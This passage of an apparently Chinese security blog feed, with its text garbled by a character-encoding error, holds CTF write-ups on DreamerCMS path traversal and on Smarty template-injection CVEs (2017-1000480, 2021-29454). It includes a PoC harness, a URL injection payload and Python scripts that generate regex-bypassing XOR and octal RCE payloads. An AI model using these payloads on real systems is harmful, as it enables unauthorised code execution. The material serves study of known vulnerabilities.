style="zoom:50%;" /><h4 id="2-æ¼æ´åˆ©ç”¨"><a href="#2-æ¼æ´åˆ©ç”¨" class="headerlink" title="2) æ¼æ´åˆ©ç”¨"></a>2) æ¼æ´åˆ©ç”¨</h4><p><code>src\main\resources\db\dreamer-cms\templates</code>å¤åˆ¶<code>default_v2</code>ç›®å½•ä¿®æ”¹æˆ<code>default_v3</code>ï¼ŒæŠŠv3çš„<code>theme.json</code>å…¶ä¸­çš„<code>themePath</code>å€¼ä¿®æ”¹æˆ<code>../../../../../../../../../../../../../../</code>ã€‚æ‰“åŒ…<code>default_v3</code>æˆ<code>default_v3.zip</code>ï¼Œåˆ°åå°é£æ ¼ç®¡ç†å¤„ä¸Šä¼ zipæ–‡ä»¶å¹¶å¯ç”¨ä¸»é¢˜ï¼Œå†åˆ°æ¨¡æ¿ç®¡ç†å¤„å°±å¯ä»¥çœ‹åˆ°ç›®å½•ä¸‹çš„æ–‡ä»¶äº†ã€‚</p><h4 id="3-æ‰¾flagæ–‡ä»¶"><a href="#3-æ‰¾flagæ–‡ä»¶" class="headerlink" title="3) æ‰¾flagæ–‡ä»¶"></a>3) æ‰¾flagæ–‡ä»¶</h4><p>å› ä¸ºæ²¡æœ‰flagè·¯å¾„ï¼Œåªèƒ½ä¸€ä¸ªæ–‡ä»¶ä¸€ä¸ªæ–‡ä»¶æ‰“å¼€æŸ¥æ‰¾flagã€‚</p><p>ï¼ˆç”±äºæ—¶é—´åŸå› ï¼Œæ²¡æœ‰æ‰¾å®Œæ‰€æœ‰çš„æ–‡ä»¶ï¼Œè€Œä¸”å¦‚æœflagåœ¨éšè—æ–‡ä»¶ä¸­ä¹Ÿæ— æ³•æ‰¾åˆ°ï¼ŒåŒæ—¶è¿™ä¸ªåŠæ³•å¾ˆç¬¨ï¼ŒæœåŠ¡å™¨ä¸Šæ–‡ä»¶å¤ªå¤šäº†ã€‚</p><p>flagåœ¨<code>è®¿é—®ç¯å¢ƒå˜é‡/proc/1/environ </code>ï¼‰</p><h3 id="2ã€åå°å‹ç¼©æ ¡éªŒä¸æ­£ç¡®å¯¼è‡´Getshell"><a href="#2ã€åå°å‹ç¼©æ ¡éªŒä¸æ­£ç¡®å¯¼è‡´Getshell" class="headerlink" title="2ã€åå°å‹ç¼©æ ¡éªŒä¸æ­£ç¡®å¯¼è‡´Getshell"></a>2ã€åå°å‹ç¼©æ ¡éªŒä¸æ­£ç¡®å¯¼è‡´Getshell</h3><h4 id="1-æ¼æ´åˆ†æ-1"><a href="#1-æ¼æ´åˆ†æ-1" class="headerlink" title="1) æ¼æ´åˆ†æ"></a>1) æ¼æ´åˆ†æ</h4><p><code>src/main/java/cc/iteachyou/cms/utils/ZipUtils.java</code>å°†*æ¢æˆ&#x2F;ï¼Œå¦‚æœæ–‡ä»¶æ„é€ è·¯å¾„<code>..*..*..*..*..*..*..*..*..*etc/passwd</code>ç»è¿‡replaceå¾—åˆ°<code>../../../../../../../../../etc/passwd</code>ï¼Œé€ æˆè·¯å¾„ç©¿è¶Šã€‚</p><img src="image-20230423115304098.png" alt="image-20230423115304098" style="zoom:50%;" /><h4 id="2-æ¼æ´åˆ©ç”¨-å†™å®šæ—¶ä»»åŠ¡"><a href="#2-æ¼æ´åˆ©ç”¨-å†™å®šæ—¶ä»»åŠ¡" class="headerlink" title="2) æ¼æ´åˆ©ç”¨-å†™å®šæ—¶ä»»åŠ¡"></a>2) æ¼æ´åˆ©ç”¨-å†™å®šæ—¶ä»»åŠ¡</h4><p>ä½†æ˜¯æœåŠ¡å™¨æ²¡æœ‰å¼€å®šæ—¶ä»»åŠ¡ï¼Œåˆ©ç”¨å¤±è´¥ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php-smartyæ¨¡ç‰ˆæ³¨å…¥RCE</title>
      <link href="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/"/>
      <url>/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/</url>
      
        <content type="html"><![CDATA[<p>å¥½ä¹…æ²¡å¤ç°æ¼æ´äº†ï¼Œæœ€è¿‘åˆ·é¢˜æ—¶é‡åˆ°äº†ä¸€é“smartyæ¨¡ç‰ˆæ³¨å…¥ï¼Œæ˜¯cve-2021-xxæ”¹ç¼–çš„ï¼Œä¾¿å¤ç°å‡ ä¸ªsmartyçš„æ¨¡ç‰ˆæ³¨å…¥cveï¼Œäº‰å–é€æ¸æ¡èµ·æ¥è½ä¸‹çš„ä¸œè¥¿ã€‚</p><p>smartyæ˜¯phpæ¨¡ç‰ˆç”Ÿæˆå·¥å…·ï¼Œå¯ä»¥å°†å¾ˆç®€å•çš„è‡ªå®šä¹‰ä»£ç æ ¹æ®å®ƒçš„è¯­æ³•è½¬æ¢æˆphpä»£ç ã€‚</p><h2 id="CVE-2017-1000480"><a href="#CVE-2017-1000480" class="headerlink" title="CVE-2017-1000480"></a>CVE-2017-1000480</h2><p>æ¼æ´åŸç†æ˜¯smartyçš„display()ä¼šå±•ç¤ºç”¨æˆ·è‡ªå®šä¹‰æ¨¡ç‰ˆï¼Œæ¨¡æ¿æ–‡ä»¶åå¯æ§ï¼Œç»“åˆfetch()å¯é€šè¿‡getæ–¹å¼è·å–æ¨¡æ¿æ–‡ä»¶åï¼ŒåŒæ—¶åœ¨è§£ææ¨¡ç‰ˆï¼ˆå³phpä»£ç ï¼‰æ—¶æœªå¯¹æ–‡ä»¶åè¿›è¡Œç‰¹æ®Šå­—ç¬¦è¿‡æ»¤ï¼Œé€ æˆRCEã€‚</p><blockquote><p>è¿™ä¸ªcveçš„å¤ç°è¿‡ç¨‹ï¼Œæˆ‘ä¸»è¦è®­ç»ƒçš„æ˜¯æ€è·¯ï¼Œå³å¦‚ä½•æ ¹æ®ä¿®è¡¥æƒ…å†µå®šä½æ¼æ´ã€æ¼æ´è§¦å‘åŸç†ä»¥åŠæ€ä¹ˆæ„é€ æ¼æ´çš„åˆ©ç”¨æ¡ä»¶ï¼Œä»è€Œå¯å‘å¦‚ä½•è‡ªå·±é€šè¿‡ä»£ç å®¡è®¡å‘ç°æ¼æ´ã€‚</p></blockquote><h3 id="0x1-æ¼æ´å®šä½"><a href="#0x1-æ¼æ´å®šä½" class="headerlink" title="0x1 æ¼æ´å®šä½"></a>0x1 æ¼æ´å®šä½</h3><h4 id="cveæè¿°-å‚å•†ä¿®è¡¥ä½ç½®"><a href="#cveæè¿°-å‚å•†ä¿®è¡¥ä½ç½®" class="headerlink" title="cveæè¿°+å‚å•†ä¿®è¡¥ä½ç½®"></a>cveæè¿°+å‚å•†ä¿®è¡¥ä½ç½®</h4><p>æ ¹æ®cveçš„æ¼æ´æè¿°å’Œå—å½±å“çš„ç‰ˆæœ¬ä»‹ç»ï¼Œä»smartyä¿®è¡¥æƒ…å†µï¼ˆgithubï¼‰ä¸Šå®šä½æ¼æ´çš„ä½ç½®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smarty 3 before 3.1.32 is vulnerable to a PHP code injection when calling fetch() or display() functions on custom resources that does not sanitize template name.</span><br></pre></td></tr></table></figure><p>githubä¸Šå¯¹3.1.32ç‰ˆæœ¬çš„change_log.txtæ‰¾åˆ°ï¼š<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/DFF1F693-E94A-46A6-AE0C-EC0CC07C804A.png" alt="aaa"><br>ç„¶åsearchå…³é”®å­—ï¼Œæ‰¾åˆ°ä¸€ä¸ªcommit 614ad1f8b9b00086efc123e49b7bb8efbfa81b61ï¼Œå¯¹ä¸‰å¤„ä»£ç è¿›è¡Œäº†change<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/C6D1CAFD-077C-451F-823C-35F44556EA2C.png" alt="94e12fd639261795854ba902db1f8275"><br>å¯ä»¥çœ‹åˆ°ä¸»è¦æ˜¯templateæ–‡ä»¶åçš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†æ›¿æ¢ï¼Œå¤§æ¦‚çŒœåˆ°æ¼æ´åŸå› æ˜¯æ„é€ äº†ç‰¹æ®Šçš„è‡ªå®šä¹‰æ¨¡æ¿æ–‡ä»¶åé€ æˆçš„ã€‚</p><h3 id="0x2-æ¼æ´è§¦å‘åŸç†åˆ†æ"><a href="#0x2-æ¼æ´è§¦å‘åŸç†åˆ†æ" class="headerlink" title="0x2 æ¼æ´è§¦å‘åŸç†åˆ†æ"></a>0x2 æ¼æ´è§¦å‘åŸç†åˆ†æ</h3><h4 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h4><p>ä»smarty 3.1.32å¯¹ä¸‰å¤„ä»£ç ä¸‹æ–­ç‚¹ã€‚</p><p>ç”±äºä¸ç†Ÿæ‚‰smartyè¯­æ³•ï¼Œå¯¹è¿™ä¸‰å¤„è¿›è¡Œé™æ€åˆ†ææ—¶ï¼Œæ‰¾ä¸åˆ°ç›¸å…³å‡½æ•°çš„ä¸Šä¸‹æ–‡å…³ç³»ï¼Œå³â€œFind Usageâ€å¤±æ•ˆï¼Œsearch å‡½æ•°ååˆæœ‰å¤ªå¤šå¤„ä»£ç ä¼šè°ƒç”¨createå‡½æ•°ã€‚å› æ­¤è½¬è€Œé€šè¿‡åŠ¨æ€è°ƒè¯•è¿›è¡Œåˆ†æã€‚</p><p>ç¬¬ä¸€ä¸ªæƒ³æ³•æ˜¯ç›´æ¥æ‹¿åˆ«äººæ„é€ å¥½çš„ä»£ç æ¥ç”¨ï¼Œä½†è¿™æ ·ä¸åˆ©äºæ¼æ´åˆ©ç”¨é“¾çš„æ„é€ ã€‚</p><p>æ ¹æ®cveæè¿°ï¼Œæ¼æ´é€šè¿‡displayå’Œfetchäº§ç”Ÿï¼Œåˆ©ç”¨smartyå®˜ç½‘çš„display()demoï¼Œå°è¯•å‡½æ•°èƒ½ä¸èƒ½æ‰§è¡Œåˆ°createã€‚å¾ˆå¹¸è¿ï¼ŒæˆåŠŸäº†ã€‚<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/8B425F92-C089-45E3-AA7A-23D160A04376.png" alt="a2192715ebe79b76bb5d161ceaa0de93"><br>æŸ¥çœ‹å¯„å­˜å™¨ï¼Œæ­¤æ—¶çš„$outputå€¼ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/* Smarty version 3.1.31, created on 2022-10-19 23:16:46</span><br><span class="line">  from &quot;[path]/templates/index.tpl&quot; */.........</span><br></pre></td></tr></table></figure><p>å³æ„é€ æ¨¡ç‰ˆæ—¶ä¼šç”Ÿæˆä¸€æ®µç‰ˆæƒå£°æ˜ï¼Œæ–‡ä»¶åæ˜¯é€šè¿‡display()ä¼ é€’çš„å‚æ•°ï¼Œè€Œæ–‡ä»¶åå¯ä»¥æ„é€ ï¼Œé‚£ä¹ˆåªè¦è®©å‰åçš„æ³¨é‡Šç¬¦é—­åˆï¼Œä¸­é—´æ’å…¥æ¶æ„ä»£ç å³å¯ã€‚</p><h4 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h4><p>createçš„è°ƒç”¨æ ˆ<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/DB37467D-76B3-4008-842E-CCE725E1554B.png" alt="05fba457e37f95e7d82618b249eca792"><br>æ ¸å¿ƒsmarty_template_compiled.phpçš„process()ï¼Œç¬¬100å’Œ103è¡Œï¼Œç¼–è¯‘å’ŒåŠ è½½æ¨¡ç‰ˆè¿‡ç¨‹<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/8671B076-B0FB-4309-9DFF-B3CB506C90DA.png" alt="853e702401f40ca280d022feeb9e9d7e"><br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/9F355EBA-AE79-494F-ADBF-C0BE40547D9D.png" alt="471dccfcc713362a5af6e8c23849cf26"></p><h3 id="0x3-poc"><a href="#0x3-poc" class="headerlink" title="0x3 poc"></a>0x3 poc</h3><p>ç»è¿‡å¤šæ¬¡è°ƒè¯•å’Œä»£ç è¿½è¸ªï¼Œdisplay()éƒ½ä¼šæ‰§è¡Œåˆ°create()ï¼Œç»“åˆfetch()ï¼Œæ„é€ ä¸€ä¸ªç±»æ¨¡æ¿ï¼Œç±»åå¯getè·å¾—ã€‚ç›´æ¥ç”¨äº†<a href="https://chybeta.github.io/2018/01/23/CVE-2017-1000480-Smarty-3-1-32-php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">chybeta</a>çš„ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">include_once(&#x27;../libs/Smarty.class.php&#x27;);</span><br><span class="line">define(&#x27;SMARTY_COMPILE_DIR&#x27;, &#x27;/tmp/templates_c&#x27;);</span><br><span class="line">define(&#x27;SMARTY_CACHE_DIR&#x27;, &#x27;/tmp/cache&#x27;);</span><br><span class="line"></span><br><span class="line">class test extends Smarty_Resource_Custom</span><br><span class="line">&#123;</span><br><span class="line">  protected function fetch($name, &amp;$source, &amp;$mtime)</span><br><span class="line">  &#123;</span><br><span class="line">    $template = &quot;CVE-2017-1000480 smarty PHP code injection&quot;;</span><br><span class="line">    $source = $template;</span><br><span class="line">    $mtime = time();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$smarty = new Smarty();</span><br><span class="line">$my_security_policy = new Smarty_Security($smarty);</span><br><span class="line">$my_security_policy-&gt;php_functions = null;</span><br><span class="line">$my_security_policy-&gt;php_handling = Smarty::PHP_REMOVE;</span><br><span class="line">$my_security_policy-&gt;modifiers = array();</span><br><span class="line">$smarty-&gt;enableSecurity($my_security_policy);</span><br><span class="line">$smarty-&gt;setCacheDir(SMARTY_CACHE_DIR);</span><br><span class="line">$smarty-&gt;setCompileDir(SMARTY_COMPILE_DIR);</span><br><span class="line">$smarty-&gt;registerResource(&#x27;test&#x27;, new test);</span><br><span class="line">$smarty-&gt;display(&#x27;test:&#x27; . $_GET[&#x27;chybeta&#x27;]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/demo/index.php?chybeta=*/phpinfo();/*</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/CBCB1774-85AA-4E1D-9572-AFFDCCE0A190.png" alt="c5f9510a1b157b5c8cff18a72c1987a4"></p><h2 id="CVE-2021-29454"><a href="#CVE-2021-29454" class="headerlink" title="CVE-2021-29454"></a>CVE-2021-29454</h2><p>è¿˜æ˜¯ä»<a href="https://github.com/smarty-php/smarty/commit/215d81a9fa3cd63d82fb3ab56ecaf97cf1e7db71">github commit</a>å…¥æ‰‹<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/D98205D2-0426-4B02-A00C-4C60C7B94B69.png" alt="547399f3be5a1048abaf779af2b5fcfd"><br>å¢åŠ å¯¹phpè§„å®šå­—ç¬¦ã€å˜é‡çš„åŒ¹é…ï¼Œå¹¶ç»™å‡ºregexpçš„æ„é€ å½¢å¼</p><p>å­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬ï¼Œä»…å¯¹ä¼ å…¥çš„æ•°å­¦è¡¨è¾¾å¼è¿›è¡Œphpè§„å®šå­—ç¬¦å˜é‡åŒ¹é…ï¼Œç¬¦åˆè§„å®šå°±eval<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/193A81EB-5208-4014-AFAA-6E1908E16525.png" alt="da076710d91d5bdec32c1fd89dfd3b98"><br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/2E8EB5E2-139C-4194-8C00-70D9A8077C9F.png" alt="785447238fb694d00cd627c442d5e3ce"><br>é‚£ä¹ˆå…³é”®æ˜¯å¦‚ä½•ç»•è¿‡reg</p><h3 id="0x1-åˆ©ç”¨"><a href="#0x1-åˆ©ç”¨" class="headerlink" title="0x1 åˆ©ç”¨"></a>0x1 åˆ©ç”¨</h3><h4 id="æ— å­—ç¬¦RCE"><a href="#æ— å­—ç¬¦RCE" class="headerlink" title="æ— å­—ç¬¦RCE"></a>æ— å­—ç¬¦RCE</h4><p>åˆ©ç”¨regå…è®¸çš„å­—ç¬¦é›†ï¼ˆ0-9ã€a-zA-Zï¼‰ã€ç™½åå•å‡½æ•°æ‹“å±•é¢å¤–çš„å­—ç¬¦é›†</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">expand_ascii</span>():<span class="comment">#0-9E.</span></span><br><span class="line">    rec = &#123;&#125;</span><br><span class="line">    var = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a,b</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(a)^<span class="built_in">ord</span>(b))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">expand</span>(<span class="params">s</span>):</span><br><span class="line">        keys = <span class="built_in">list</span>(rec.keys())</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> keys:</span><br><span class="line">            t = xor(s,c)</span><br><span class="line">            <span class="keyword">if</span> t <span class="keyword">not</span> <span class="keyword">in</span> rec.keys():</span><br><span class="line">                rec[t] = rec[s]+rec[c] <span class="comment">#è®°å½•æ–°æ‰©å±•çš„å­—ç¬¦ç”±å“ªä¸¤ä¸ªå…ƒå­—ç¬¦æ„æˆï¼ˆlist+list=&gt;listï¼‰</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">expand_all</span>():</span><br><span class="line">        <span class="comment">#æ„é€ 0-9E. å­—å…¸ rec = &#123;dict&#125;&#123;&#x27;0&#x27;:[&#x27;0&#x27;]&#125;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            rec[<span class="built_in">str</span>(i)] = <span class="built_in">list</span>(<span class="built_in">str</span>(i))</span><br><span class="line">        rec[<span class="string">&quot;E&quot;</span>] = [<span class="string">&quot;E&quot;</span>]</span><br><span class="line">        rec[<span class="string">&quot;.&quot;</span>] = [<span class="string">&quot;...&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):<span class="comment">#</span></span><br><span class="line">            expand(random.choice(<span class="built_in">list</span>(rec.keys())))</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> rec.keys():</span><br><span class="line">            c = Counter(rec[k]) <span class="comment">#è®¡ç®—æ¯ä¸ªvalueçš„å€¼çš„é‡å¤ä¸ªæ•°</span></span><br><span class="line">            rec[k] = [_ <span class="keyword">for</span> _ <span class="keyword">in</span> c.keys() <span class="keyword">if</span> c[_] % <span class="number">2</span>] <span class="comment">#æ‰©å±•å­—ç¬¦é›†çš„æ•°æ®å¤„ç†ï¼Œæ¯”æ–¹è¯´&#x27;k&#x27;=X^Y=&#x27;3&#x27;^&#x27;..,&#x27;^&#x27;3&#x27;^&#x27;E&#x27;=&#x27;...&#x27;^&#x27;E&#x27;ï¼Œéœ€è¦å‰”é™¤é‡å¤çš„ï¼Œå³å¼‚æˆ–åä¸º0çš„</span></span><br><span class="line">            <span class="built_in">print</span>(rec)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">        expand_all()</span><br><span class="line">        <span class="comment">#åˆ¶å®šæ¨¡æ¿</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            c = <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+i)</span><br><span class="line">            var[<span class="built_in">str</span>(i)] = <span class="string">f&quot;((<span class="subst">&#123;c&#125;</span>.<span class="subst">&#123;c&#125;</span>)[0])&quot;</span></span><br><span class="line">        var[<span class="string">&quot;E&quot;</span>] = <span class="string">&quot;((exp(100).b)[15])&quot;</span>  <span class="comment"># exp(100)==2.6881171418161E+43</span></span><br><span class="line">        var[<span class="string">&quot;...&quot;</span>] = <span class="string">&quot;((exp(100).b)[1])&quot;</span>  <span class="comment"># point =&gt; .</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_code</span>(<span class="params">cmd</span>): <span class="comment"># å‚æ•°å‘½åæ—¶è¦ä»¥å…¶å®é™…å«ä¹‰ï¼Œè€Œä¸æ˜¯å‚æ•°ç±»å‹ï¼Œä¸€å¼€å§‹ä»…æƒ³åˆ°strï¼Œä½†æ˜¯strå…·ä½“ä»£è¡¨ä»€ä¹ˆå‘¢</span></span><br><span class="line">        code = [<span class="string">f&quot;(<span class="subst">&#123;<span class="string">&#x27;^&#x27;</span>.join(rec[c])&#125;</span>)&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> cmd] <span class="comment">#åˆ©ç”¨å­—ç¬¦é›†æ„é€ å‘½ä»¤</span></span><br><span class="line">        <span class="comment">#f&quot;(&#123;&#x27;^&#x27;.join(rec[c])&#125;)&quot; å¦‚ä½•å¾—åˆ°&#x27;(5^E)&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;.&quot;</span>.join(code)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">replace_var</span>(<span class="params">code</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> var.keys():</span><br><span class="line">            code = code.replace(c,var[c])</span><br><span class="line">        <span class="keyword">return</span> code</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_exp</span>(<span class="params">expr</span>):</span><br><span class="line">        var_expr = [<span class="string">&quot;=&quot;</span>.join((<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+i),<span class="built_in">str</span>(i))) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;string: &#123;math equation=&quot;%s&quot; %s&#125;&#x27;</span> % (expr, <span class="string">&quot; &quot;</span>.join(var_expr))</span><br><span class="line"></span><br><span class="line">    init()</span><br><span class="line">    func = replace_var(generate_code(<span class="string">&quot;phpinfo&quot;</span>))</span><br><span class="line">    payload = generate_exp(<span class="string">f&quot;(<span class="subst">&#123;func&#125;</span>)()&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h4 id="æ ¹æ®regæ‰¾æ¼ç½‘ä¹‹é±¼"><a href="#æ ¹æ®regæ‰¾æ¼ç½‘ä¹‹é±¼" class="headerlink" title="æ ¹æ®regæ‰¾æ¼ç½‘ä¹‹é±¼"></a>æ ¹æ®regæ‰¾æ¼ç½‘ä¹‹é±¼</h4><p>åŒ¹é…ä¸­ä»…å‰”é™¤åå¼•å·ã€ç¾å…ƒç¬¦ï¼ˆè¯¥ç¬¦å·å¯è‡ªå®šä¹‰å˜é‡ï¼‰ï¼Œå¯ä»¥æ„é€ å…«è¿›åˆ¶å­—ç¬¦ä¸²å®ç°ï¼ˆå…«è¿›åˆ¶ç‰¹å¾ï¼šåæ–œæ ã€æ•°å­—ï¼‰</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;(&quot;phpinfo&quot;)()&#x27;</span></span><br><span class="line">string = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment">#print(i)</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">        string += <span class="string">&#x27;\\&quot;&#x27;</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">        string += <span class="string">&#x27;(&#x27;</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">        string += <span class="string">&#x27;)&#x27;</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">        string += <span class="string">&#x27;,&#x27;</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    string += <span class="string">&#x27;\\\\&#x27;</span> + <span class="built_in">oct</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(string)</span><br></pre></td></tr></table></figure><blockquote><p>tips:<br>æ„é€ RCEçš„æ—¶å€™ï¼Œå‡½æ•°åç§°è¦ç”¨(â€œâ€)åŒ…å«èµ·æ¥ï¼Œä¸ç„¶åˆ©ç”¨ä¸æˆåŠŸï¼Œè°ƒè¯•è¿‡ç¨‹ä¸­æ²¡å‘ç°smartyçš„ç‰¹æ®Šè¦æ±‚</p></blockquote><p>refï¼š<a href="https://250.ac.cn/2022/03/22/CVE-2021-29454/#smarty">https://250.ac.cn/2022/03/22/CVE-2021-29454/#smarty</a></p><h3 id="0x2-ä¾‹é¢˜"><a href="#0x2-ä¾‹é¢˜" class="headerlink" title="0x2 ä¾‹é¢˜"></a>0x2 ä¾‹é¢˜</h3><p>2022çº¢æ˜è°·æ¯ Smarty Caculator</p><p>å­˜åœ¨æºç æ³„éœ²ï¼ˆå·¥å…·è·‘äº†ä¸€ä¸ªæ™šä¸Šï¼Œæ‰æ‰¾åˆ°â€¦â€¦ï¼‰</p><p>æ ¹æ®ç‰ˆæœ¬å¯¹æ¯”githubç‰ˆæœ¬ï¼Œä»…ä¸‰ä¸ªæ–‡ä»¶è¢«ä¿®æ”¹ï¼Œç„¶åå°±ç›¯ç€è¢«ä¿®æ”¹çš„åœ°æ–¹æ­»æ´»æƒ³ä¸æ˜ç™½è·Ÿè¿™ä¸ªcveæœ‰ä»€ä¹ˆå…³ç³»â€¦â€¦</p><blockquote><p>åæ¥æ‰ç»•å‡ºæ¥ï¼Œä¾‹é¢˜ç‰ˆæœ¬&lt;CVEç‰ˆæœ¬ï¼Œè¯¥CVEå¯ä»¥ç›´æ¥åˆ©ç”¨â€¦â€¦éº»äº†ï¼Œé™·å…¥äº†æ€ç»´å®šå¼</p></blockquote>]]></content>
      
      
      
        <tags>
            
